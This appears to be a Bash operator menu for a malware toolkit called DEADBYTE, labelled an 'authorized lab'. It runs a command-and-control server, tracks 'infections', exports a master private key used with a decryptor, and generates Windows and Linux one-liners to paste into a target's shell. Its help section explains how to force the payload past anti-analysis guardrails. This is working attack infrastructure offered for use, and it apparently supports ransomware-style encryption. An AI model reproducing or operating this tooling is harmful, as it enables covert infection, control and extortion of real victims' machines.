#!/usr/bin/env bash
# =====================================================================
# DEADBYTE OPS MENU — everything in one place (Kali).
# Uso:  bash scripts/menu.sh
#       ./scripts/menu.sh
# =====================================================================
set -euo pipefail
cd "$(dirname "$0")/.."
ROOT="$(pwd)"
DIST="$ROOT/dist"
OUT="$ROOT/delivery/out"
PORT="${PORT:-8443}"
ADMIN_TOKEN="${ADMIN_TOKEN:-change-me-admin-token}"
BEACON_TOKEN="${BEACON_TOKEN:-change-me-beacon-token}"
MASTER_SECRET="${MASTER_SECRET:-change-me-master-secret}"
INTERVAL="${INTERVAL:-30}"
DB="${DB:-$ROOT/deadbyte.db}"
LOG="${LOG:-$ROOT/c2.log}"
PIDF="${PIDF:-$ROOT/.c2.pid}"
PUBKEY_FILE="${PUBKEY_FILE:-$ROOT/.pubkey.txt}"

DETECTED_IP="$(hostname -I 2>/dev/null | awk '{print $1}')" || true
C2_IP="${C2_IP:-${DETECTED_IP:-192.0.2.10}}"
C2_URL="http://$C2_IP:$PORT"

GOOS_L="$(uname -s | tr 'A-Z' 'a-z')"
GOARCH_L="$(uname -m)"
case "$GOARCH_L" in x86_64|amd64) GOARCH_L=amd64;; aarch64|arm64) GOARCH_L=arm64;; esac
C2BIN="$DIST/deadbyte-c2-$GOOS_L-$GOARCH_L"
PAYBIN="$DIST/deadbyte-payload-$GOOS_L-$GOARCH_L"
[ -x "$C2BIN" ] || C2BIN="$DIST/deadbyte-c2-linux-amd64"
[ -x "$PAYBIN" ] || PAYBIN="$DIST/deadbyte-payload-linux-amd64"

# --- UI ---
G='\033[1;32m'; Y='\033[1;33m'; R='\033[1;31m'; C='\033[1;36m'; D='\033[2m'; N='\033[0m'; B='\033[1m'
say(){ printf "${G}[+]${N} %s\n" "$*"; }
warn(){ printf "${Y}[!]${N} %s\n" "$*"; }
die(){ printf "${R}[x]${N} %s\n" "$*"; return 1; }
pause(){ printf "\n${D}[enter]${N} "; read -r _ || true; }
cls(){ clear 2>/dev/null || printf '\033c'; }

c2_alive(){ curl -sf --max-time 2 "http://127.0.0.1:$PORT/api/v1/key/public" >/dev/null 2>&1; }
c2_pid(){ [ -f "$PIDF" ] && cat "$PIDF" 2>/dev/null || pgrep -f "deadbyte-c2" 2>/dev/null | head -1 || true; }
get_pub(){
  local j
  j="$(curl -sf --max-time 2 "http://127.0.0.1:$PORT/api/v1/key/public" 2>/dev/null)" || true
  if [ -n "$j" ]; then printf '%s' "$j" | sed -E 's/.*"public_key":"([^"]+)".*/\1/'; return; fi
  [ -f "$PUBKEY_FILE" ] && grep -oE '[A-Za-z0-9+/=]{40,}' "$PUBKEY_FILE" | head -1 || true
}

banner(){
  cls
  printf "${G}"
  cat <<'BAN'
 ____  _____    _    ____  ______   _______ _____
|  _ \| ____|  / \  |  _ \| __ ) \ / /_   _| ____|
| | | |  _|   / _ \ | | | |  _ \\ V /  | | |  _|
| |_| | |___ / ___ \| |_| | |_) || |   | | | |___
|____/|_____/_/   \_\____/|____/ |_|   |_| |_____|
BAN
  printf "${N}"
  printf "  ${C}CRYPTO:DIVISION${N}  ${D}// ops menu // authorized lab${N}\n"
  printf "  ${D}─────────────────────────────────────────────────────${N}\n"
  local st pub pid
  if c2_alive; then
    st="${G}ONLINE${N}"
    pub="$(get_pub)"
    pid="$(c2_pid)"
  else
    st="${R}OFFLINE${N}"
    pub="—"
    pid="—"
  fi
  printf "  C2     : %b   %s:%s  pid=%s\n" "$st" "$C2_IP" "$PORT" "$pid"
  printf "  painel : ${C}http://%s:%s/${N}   token=${Y}%s${N}\n" "$C2_IP" "$PORT" "$ADMIN_TOKEN"
  printf "  pubkey : ${D}%s${N}\n" "${pub:0:44}${pub:+…}"
  printf "  dir    : %s\n" "$ROOT"
  printf "  ${D}─────────────────────────────────────────────────────${N}\n"
}

# ---------- acoes ----------
do_setup(){
  say "setup + test suite"
  C2_IP="$C2_IP" PORT="$PORT" ADMIN_TOKEN="$ADMIN_TOKEN" BEACON_TOKEN="$BEACON_TOKEN" \
    MASTER_SECRET="$MASTER_SECRET" INTERVAL="$INTERVAL" bash scripts/setup-kali.sh
  pause
}

do_start(){
  if c2_alive; then warn "C2 ja no ar (pid $(c2_pid))"; pause; return; fi
  [ -x "$C2BIN" ] || die "C2 binary missing: $C2BIN — run setup (option 1)"
  if [ ! -f "$DB" ]; then
    say "generating master key"
    "$C2BIN" -listen "0.0.0.0:$PORT" -db "$DB" -admin-token "$ADMIN_TOKEN" \
      -beacon-token "$BEACON_TOKEN" -master-secret "$MASTER_SECRET" -gen 2>/dev/null | tee "$PUBKEY_FILE"
  fi
  say "starting C2 on 0.0.0.0:$PORT"
  nohup "$C2BIN" -listen "0.0.0.0:$PORT" -db "$DB" -admin-token "$ADMIN_TOKEN" \
    -beacon-token "$BEACON_TOKEN" -master-secret "$MASTER_SECRET" \
    -beacon-interval "$INTERVAL" -dist "$DIST" -verbose >> "$LOG" 2>&1 &
  echo $! > "$PIDF"
  for _ in $(seq 1 12); do c2_alive && break; sleep 0.5; done
  if c2_alive; then
    say "C2 ONLINE  pid=$(cat "$PIDF")  log=$LOG"
    say "painel: http://$C2_IP:$PORT/   token=$ADMIN_TOKEN"
  else
    die "C2 did not start - see $LOG"
  fi
  pause
}

do_stop(){
  local p
  p="$(c2_pid)"
  if [ -z "$p" ]; then warn "no active C2"; pause; return; fi
  kill "$p" 2>/dev/null || true
  pkill -f "deadbyte-c2" 2>/dev/null || true
  rm -f "$PIDF"
  sleep 0.5
  if c2_alive; then die "still alive — kill -9 $p"; else say "C2 stopped"; fi
  pause
}

do_status(){
  if c2_alive; then
    say "ONLINE  pid=$(c2_pid)"
    echo "  pubkey : $(get_pub)"
    echo "  infections:"
    curl -s "http://127.0.0.1:$PORT/api/v1/infections" -H "Authorization: Bearer $ADMIN_TOKEN" | head -c 800; echo
    echo "  events (ultimos):"
    curl -s "http://127.0.0.1:$PORT/api/v1/events" -H "Authorization: Bearer $ADMIN_TOKEN" | head -c 800; echo
  else
    warn "OFFLINE"
  fi
  if [ -f "$LOG" ]; then
    echo
    say "last log lines ($LOG):"
    tail -n 12 "$LOG" 2>/dev/null || true
  fi
  pause
}

do_tests(){
  c2_alive || { warn "C2 offline - starting..."; do_start; }
  say "bateria rapida"
  C2_IP="$C2_IP" PORT="$PORT" ADMIN_TOKEN="$ADMIN_TOKEN" BEACON_TOKEN="$BEACON_TOKEN" \
    MASTER_SECRET="$MASTER_SECRET" INTERVAL="$INTERVAL" KEEP=1 STOP=0 \
    bash scripts/setup-kali.sh
  pause
}

do_gen_delivery(){
  c2_alive || { warn "C2 offline - starting..."; do_start; }
  C2_IP="$C2_IP" PORT="$PORT" ADMIN_TOKEN="$ADMIN_TOKEN" BEACON_TOKEN="$BEACON_TOKEN" \
    bash scripts/gen-delivery.sh all
  echo
  say "files generated in $OUT/"
  ls -la "$OUT" 2>/dev/null || true
  echo
  if [ -f "$OUT/win-oneliner.txt" ]; then
    say "WINDOWS - paste THIS into the target's PowerShell (regular user, NOT Admin):"
    printf "${Y}"
    cat "$OUT/win-oneliner.txt"
    printf "${N}\n"
  fi
  pause
}

do_show_win(){
  if [ ! -f "$OUT/win-oneliner.txt" ]; then
    warn "not generated yet - generating now..."
    do_gen_delivery
    return
  fi
  say "one-liner Windows (blob REAL embutido):"
  printf "${Y}"
  cat "$OUT/win-oneliner.txt"
  printf "${N}\n\n"
  say "or copy the file: $OUT/win.ps1"
  if command -v xclip >/dev/null 2>&1; then
    xclip -selection clipboard < "$OUT/win-oneliner.txt" && say "copiado para o clipboard (xclip)"
  elif command -v wl-copy >/dev/null 2>&1; then
    wl-copy < "$OUT/win-oneliner.txt" && say "copiado para o clipboard (wl-copy)"
  fi
  pause
}

do_show_linux(){
  if [ ! -f "$OUT/linux-oneliner.txt" ]; then
    warn "not generated yet - generating now..."
    do_gen_delivery
    return
  fi
  say "one-liner Linux:"
  printf "${Y}"
  cat "$OUT/linux-oneliner.txt"
  printf "${N}\n"
  pause
}

do_export_key(){
  c2_alive || die "C2 offline"
  say "exporting master private key"
  curl -s -X POST "http://127.0.0.1:$PORT/api/v1/key/export" \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "X-Master-Secret: $MASTER_SECRET" | tee "$ROOT/master-key-export.json"
  echo
  say "saved to $ROOT/master-key-export.json"
  pause
}

do_list_inf(){
  c2_alive || die "C2 offline"
  curl -s "http://127.0.0.1:$PORT/api/v1/infections" -H "Authorization: Bearer $ADMIN_TOKEN" | {
    if command -v jq >/dev/null 2>&1; then jq .; else cat; fi
  }
  echo
  pause
}

do_open_panel(){
  local url="http://$C2_IP:$PORT/"
  say "painel: $url   token: $ADMIN_TOKEN"
  if command -v xdg-open >/dev/null 2>&1; then xdg-open "$url" >/dev/null 2>&1 || true
  elif command -v open >/dev/null 2>&1; then open "$url" >/dev/null 2>&1 || true
  fi
  pause
}

do_build(){
  say "rebuilding the full matrix (24 binaries)"
  bash scripts/build-all.sh
  pause
}

do_lab(){
  say "smoke test local (payload -> C2 -> decryptor)"
  bash scripts/run-lab.sh
  pause
}

do_firewall(){
  if command -v ufw >/dev/null 2>&1; then
    if sudo -n true 2>/dev/null; then
      sudo -n ufw allow "$PORT/tcp" && say "ufw: $PORT/tcp open"
    else
      warn "rode: sudo ufw allow $PORT/tcp"
    fi
  else
    warn "ufw not installed - check iptables/firewalld manually"
  fi
  pause
}

do_tail_log(){
  [ -f "$LOG" ] || die "no log: $LOG"
  say "Ctrl+C to return to the menu"
  tail -n 40 -f "$LOG" || true
}

do_help_win(){
  cat << HLP

${B}WHY "NOTHING HAPPENS" ON WINDOWS${N}
  1. You passed the literal text ${R}<BLOB>${N} in -config.
     The payload tries base64-decode, fails and exits silently
     (hidden window). NEVER use <BLOB> - use the one-liner
     generated by the menu (option 5/6), which already embeds the real blob.

  2. PowerShell ${Y}as Administrator${N}: the payload aborts
     on the guardrail (analysis/elevated). Use NORMAL PowerShell
     as a regular user. The one-liner already passes -force.

  3. VM with <=2 vCPUs: same guardrail. -force covers it.

  4. Wrong token (e.g. an old change-me-admin-token). The correct one is:
     ${G}change-me-admin-token${N}

${B}CORRECT FLOW (3 steps)${N}
  on Kali:   menu > 1 setup  > 2 start  > 5 generate delivery
  on Win:    paste the one-liner (option 6) into normal PowerShell
  on Kali:   menu > 4 status   (the infection should appear)
             or open the panel (option 10)

${B}DIAGNOSTICS ON THE TARGET${N}
  Get-Content \$env:TEMP\deadbyte.log -Wait
  If you see: FATAL: config: illegal base64 data
  -> the blob is still a placeholder. Regenerate the delivery on Kali.

HLP
  pause
}

# ---------- loop ----------
while true; do
  banner
  printf "  ${B}SETUP / C2${N}\n"
  printf "   ${G}1${N}) full setup + tests (one command)\n"
  printf "   ${G}2${N}) start C2\n"
  printf "   ${G}3${N}) stop C2\n"
  printf "   ${G}4${N}) status / infections / events\n"
  printf "   ${G}9${N}) run the test suite (C2 running)\n"
  printf "  ${G}11${N}) open the firewall (ufw $PORT/tcp)\n"
  printf "  ${G}12${N}) view the C2 log (tail -f)\n"
  printf "\n  ${B}DELIVERY (target)${N}\n"
  printf "   ${G}5${N}) generate the delivery pack (REAL blob embedded)\n"
  printf "   ${G}6${N}) show / copy the WINDOWS one-liner\n"
  printf "   ${G}7${N}) show the LINUX one-liner\n"
  printf "  ${G}13${N}) help: Windows does not work\n"
  printf "\n  ${B}OPS${N}\n"
  printf "   ${G}8${N}) export master private key\n"
  printf "  ${G}10${N}) open the panel in the browser\n"
  printf "  ${G}14${N}) list infections (JSON)\n"
  printf "  ${G}15${N}) rebuild 24 binaries\n"
  printf "  ${G}16${N}) local lab smoke test\n"
  printf "\n   ${R}0${N}) quit\n"
  printf "\n  ${C}>${N} "
  read -r op || exit 0
  case "$op" in
    1) do_setup ;;
    2) do_start ;;
    3) do_stop ;;
    4) do_status ;;
    5) do_gen_delivery ;;
    6) do_show_win ;;
    7) do_show_linux ;;
    8) do_export_key ;;
    9) do_tests ;;
    10) do_open_panel ;;
    11) do_firewall ;;
    12) do_tail_log ;;
    13) do_help_win ;;
    14) do_list_inf ;;
    15) do_build ;;
    16) do_lab ;;
    0|q|Q) say "flw."; exit 0 ;;
    *) warn "opcao invalida"; sleep 1 ;;
  esac
done
